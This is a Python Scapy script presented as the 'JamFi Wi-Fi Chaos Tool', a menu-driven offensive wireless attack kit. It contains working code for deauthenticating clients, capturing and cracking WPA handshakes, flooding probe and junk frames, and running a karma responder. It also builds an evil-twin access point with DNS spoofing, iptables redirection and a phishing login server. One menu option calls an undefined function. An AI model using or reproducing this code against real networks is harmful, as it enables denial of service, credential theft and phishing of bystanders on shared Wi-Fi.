#!/usr/bin/env python3
import os
import sys
import time
from scapy.all import *
from threading import Thread
from random import choice, randint
from http.server import SimpleHTTPRequestHandler, HTTPServer

seen_aps = {}
clients = {}
scan_results = {}

vendor_prefixes = [
    "00:11:22", "00:0C:29", "D8:96:95", "F4:5C:89", "3C:5A:B4",
    "B8:27:EB", "8C:85:90", "40:B0:34", "A4:5E:60", "E0:3F:49"
]

def print_banner():
    print(r"""
     ██╗ █████╗ ███╗   ███╗        ███████╗██╗
     ██║██╔══██╗████╗ ████║        ██╔════╝██║
     ██║███████║██╔████╔██║        █████╗  ██║
██   ██║██╔══██║██║╚██╔╝██║        ██╔══╝  ██║
╚█████╔╝██║  ██║██║ ╚═╝ ██║███████╗██║     ██║
 ╚════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚═╝     ╚═╝
        💜  JamFi Wi-Fi Chaos Tool  💜
              by ekoms savior
""")

def channel_hopper(iface):
    while True:
        for ch in range(1, 14):
            os.system(f"iwconfig {iface} channel {ch}")
            time.sleep(0.3)

def packet_handler(pkt):
    if pkt.haslayer(Dot11Beacon):
        bssid = pkt[Dot11].addr3
        ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "<Hidden SSID>"
        if bssid not in seen_aps:
            seen_aps[bssid] = ssid
            scan_results[bssid] = {"ssid": ssid, "clients": []}
            print(f"📶 AP: {ssid:<25} BSSID: {bssid}")
    if pkt.haslayer(Dot11) and pkt.type == 2:
        src = pkt.addr2
        bssid = pkt.addr3
        if bssid in seen_aps and src != bssid and src not in clients:
            clients[src] = bssid
            scan_results[bssid]["clients"].append(src)
            print(f"    💡 Client: {src} -> {seen_aps[bssid]}")

def scan_clients():
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    if not iface:
        print("⚠️ Interface not entered.")
        return
    print("📡 Scanning for clients and APs... (CTRL+C to stop)\n")
    Thread(target=channel_hopper, args=(iface,), daemon=True).start()
    try:
        sniff(iface=iface, prn=packet_handler, store=0)
    except KeyboardInterrupt:
        print("✅ Scan stopped.")

def capture_handshake(iface, bssid):
    os.makedirs("loot", exist_ok=True)
    path = f"loot/handshake_{bssid.replace(':','')}.pcap"
    print(f"📡 Capturing handshake to {bssid}, saving to {path}")
    def eapol(pkt): return pkt.haslayer(EAPOL) and pkt.addr2 == bssid
    pkts = sniff(iface=iface, lfilter=eapol, timeout=60)
    if pkts:
        wrpcap(path, pkts)
        print(f"✅ Saved handshake to {path}")
    else:
        print("⚠️ No handshake captured.")

def deauth_attack():
    iface = input("💜 Monitor mode interface: ").strip()
    target = input("💜 Target Client MAC: ").strip()
    ap = input("💜 Access Point MAC: ").strip()
    count = int(input("💜 Number of packets: ") or 100)
    delay = float(input("💜 Delay between packets: ") or 0.05)
    capture = input("💜 Capture handshake? (y/n): ").strip().lower()
    if capture == "y":
        Thread(target=capture_handshake, args=(iface, ap)).start()
        time.sleep(2)
    frame = RadioTap()/Dot11(addr1=target, addr2=ap, addr3=ap)/Dot11Deauth(reason=7)
    sendp(frame, iface=iface, count=count, inter=delay)
    print("✅ Deauth complete!")

def deauth_all():
    iface = input("💜 Monitor mode interface: ").strip()
    if not scan_results:
        print("⚠️ Run scan first!")
        return
    count = int(input("💜 Number of packets per client (default 100): ") or 100)
    delay = float(input("💜 Delay between packets (default 0.05): ") or 0.05)
    print("💥 Deauthing all clients and sniffing handshakes...\n")
    for bssid, data in scan_results.items():
        Thread(target=capture_handshake, args=(iface, bssid), daemon=True).start()
        for client in data["clients"]:
            frame = RadioTap()/Dot11(addr1=client, addr2=bssid, addr3=bssid)/Dot11Deauth(reason=7)
            sendp(frame, iface=iface, count=count, inter=delay, verbose=0)
            print(f"🚀 Deauthed {client} from {data['ssid']}")

def crack_handshakes():
    print("🔓 Crack Captured Handshakes")
    loot_dir = "loot"
    pcaps = [f for f in os.listdir(loot_dir) if f.endswith(".pcap")]
    if not pcaps:
        print("⚠️ No .pcap handshake files found in loot/")
        return

    print("\n📁 Available Handshakes:")
    for i, p in enumerate(pcaps):
        print(f"{i+1}. {p}")
    choice = input("💜 Choose a handshake file to crack: ").strip()
    if not choice.isdigit() or int(choice) < 1 or int(choice) > len(pcaps):
        print("⚠️ Invalid selection.")
        return
    pcap_file = os.path.join(loot_dir, pcaps[int(choice)-1])
    
    method = input("🛠️ Crack with (1) Aircrack-ng or (2) Hashcat? [1/2]: ").strip()
    wordlist = input("📚 Wordlist path (default: /usr/share/wordlists/rockyou.txt): ").strip() or "/usr/share/wordlists/rockyou.txt"
    
    if method == "1":
        print("🚀 Launching Aircrack-ng...")
        os.system(f"aircrack-ng {pcap_file} -w {wordlist}")
    elif method == "2":
        hccapx = pcap_file.replace(".pcap", ".hccapx")
        print("🔄 Converting pcap to hccapx...")
        os.system(f"cap2hccapx {pcap_file} {hccapx}")
        print("🚀 Launching Hashcat...")
        os.system(f"hashcat -m 2500 {hccapx} {wordlist} --force")
    else:
        print("⚠️ Invalid choice.")

def probe_spammer():
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    ssids = ["FreeWiFi", "Starbucks", "McDonald's", "Xfinity", "SchoolWiFi", "UnicornNet"]
    print("📡 Spamming probe requests...")
    while True:
        for ssid in ssids:
            pkt = RadioTap()/Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                addr2=RandMAC(), addr3=RandMAC())/Dot11ProbeReq()/Dot11Elt(ID=0, info=ssid)
            sendp(pkt, iface=iface, verbose=0)
        time.sleep(0.2)

def junk_flood():
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    print("💣 Sending junk packets...")
    while True:
        pkt = RadioTap()/Dot11(addr1=RandMAC(), addr2=RandMAC(), addr3=RandMAC())/Raw(load=os.urandom(50))
        sendp(pkt, iface=iface, verbose=0)

def karma_responder():
    iface = input("💜 Monitor mode interface (e.g. wlan0mon): ").strip()
    print("🧲 Karma responder: answering all probe requests...")
    def handle(pkt):
        if pkt.haslayer(Dot11ProbeReq):
            ssid = pkt[Dot11Elt].info.decode(errors='ignore') or "FreeWiFi"
            resp = RadioTap()/Dot11(type=0, subtype=8, addr1=pkt.addr2,
                addr2=RandMAC(), addr3=RandMAC())/Dot11Beacon(cap="ESS")/Dot11Elt(ID=0, info=ssid)
            sendp(resp, iface=iface, verbose=0)
            print(f"✨ Responded to probe for: {ssid}")
    sniff(iface=iface, prn=handle)

def chaos_mode():
    print("💃 Chaos Mode Engaged!")
    Thread(target=probe_spammer).start()
    Thread(target=junk_flood).start()
    Thread(target=karma_responder).start()

def evil_ap_mode():
    print("👿 Starting Fully Connectable Evil AP Mode...")

    iface = input("💜 Interface (e.g. wlan0): ").strip()
    ssid = input("💜 SSID to broadcast (e.g. Free_Public_WiFi): ").strip()

    os.makedirs("loot", exist_ok=True)

    print("🧹 Cleaning up old services...")
    os.system("sudo pkill -f hostapd")
    os.system("sudo pkill -f dnsmasq")
    os.system("sudo pkill -f dnsspoof")
    os.system("sudo pkill -f phish_server.py")

    print("🌐 Configuring network interface...")
    os.system(f"sudo ip link set {iface} down")
    os.system(f"sudo ip addr flush dev {iface}")
    os.system(f"sudo ip addr add 10.0.0.1/24 dev {iface}")
    os.system(f"sudo ip link set {iface} up")

    hostapd_conf = f"""
interface={iface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
    """.strip()

    with open("loot/hostapd.conf", "w") as f:
        f.write(hostapd_conf)

    dnsmasq_conf = f"""
interface={iface}
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
    """.strip()

    with open("loot/dnsmasq.conf", "w") as f:
        f.write(dnsmasq_conf)

    # Start services
    print(f"📶 Starting Evil AP on {iface} with SSID: {ssid}")
    os.system(f"sudo hostapd loot/hostapd.conf &")
    time.sleep(2)

    print("🧠 Launching dnsmasq...")
    os.system(f"sudo dnsmasq -C loot/dnsmasq.conf &")

    print("💻 Hosting phishing login at http://10.0.0.1 ...")
    os.system("sudo python3 loot/phish_server.py &")

    print("🔀 Enabling HTTP redirection with iptables...")
    os.system("sudo iptables -t nat -F")
    os.system("sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
    os.system("sudo iptables -t nat -A POSTROUTING -j MASQUERADE")

    print("🎯 Launching dnsspoof to redirect all DNS to 10.0.0.1")
    with open("loot/dnsspoof_hosts", "w") as f:
        f.write("10.0.0.1 *\n")
    os.system(f"sudo dnsspoof -i {iface} -f loot/dnsspoof_hosts &")


def mitm_hid_injection():
    print("🧠 Starting MITM HID Injection Mode...")
    iface = input("💜 Enter monitor mode interface (e.g. wlan0mon): ").strip()
    ssid = input("💜 SSID clients think they’re connecting to: ").strip()
    fake = input("💜 Broadcast name that will appear: ").strip()
    os.makedirs("loot", exist_ok=True)

    print(f"📶 Broadcasting fake AP: {fake}")
    beacon = RadioTap()/Dot11(
        addr1="ff:ff:ff:ff:ff:ff",
        addr2=RandMAC(), addr3=RandMAC()
    )/Dot11Beacon()/Dot11Elt(ID=0, info=fake)

    Thread(target=lambda: sendp(beacon, iface=iface, inter=0.05, loop=1, verbose=0), daemon=True).start()

    html = f"""<html><body>
    <h2>Welcome to {ssid}</h2>
    <p>Connecting... please wait.</p>
    <script>
    setTimeout(() => {{
        alert("Installing driver...");
        let keys = ["Windows+R", "cmd", "ENTER", "whoami", "ENTER"];
        let i = 0;
        function typeNext() {{
            if (i < keys.length) {{
                console.log("Injecting:", keys[i]);
                i++;
                setTimeout(typeNext, 1500);
            }}
        }}
        typeNext();
    }}, 3000);
    </script></body></html>"""

    with open("loot/injection.html", "w") as f:
        f.write(html)

    print("💻 Hosting fake page at http://0.0.0.0:8080")
    os.chdir("loot")
    server = HTTPServer(('0.0.0.0', 8080), SimpleHTTPRequestHandler)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("🛑 MITM HID server stopped.")
        server.server_close()
def main():
    print_banner()
    while True:
        print("\n🔹 1️⃣  Scan Clients & APs 🔍")
        print("🔹 2️⃣  Deauth One Client 💥")
        print("🔹 3️⃣  Deauth ALL Clients + Capture 🔓")
        print("🔹 4️⃣  Crack Captured Handshakes 🔓")
        print("🔹 5️⃣  Probe Request Spam 📡")
        print("🔹 6️⃣  Junk Packet Flood 💣")
        print("🔹 7️⃣  Karma Responder 🧲")
        print("🔹 8️⃣  Chaos Mode 💃")
        print("🔹 9️⃣  View Loot 📁")
        print("🔹 🔟  Evil AP 👿")
        print("🔹 11️⃣ MITM HID Injection 🧠")
        print("🔹 0️⃣  Quit ❌")
        choice = input("💜 Choose an option: ").strip()

        if choice == "1": scan_clients()
        elif choice == "2": deauth_attack()
        elif choice == "3": deauth_all()
        elif choice == "4": crack_handshakes()
        elif choice == "5": probe_spammer()
        elif choice == "6": junk_flood()
        elif choice == "7": karma_responder()
        elif choice == "8": chaos_mode()
        elif choice == "9": loot_viewer()
        elif choice == "10": evil_ap_mode()
        elif choice == "11": mitm_hid_injection()
        elif choice == "0":
            print("👋 Goodbye fren! XOXOXO 💜")
            sys.exit()
        else:
            print("⚠️ Invalid choice!")

if __name__ == "__main__":
    main()

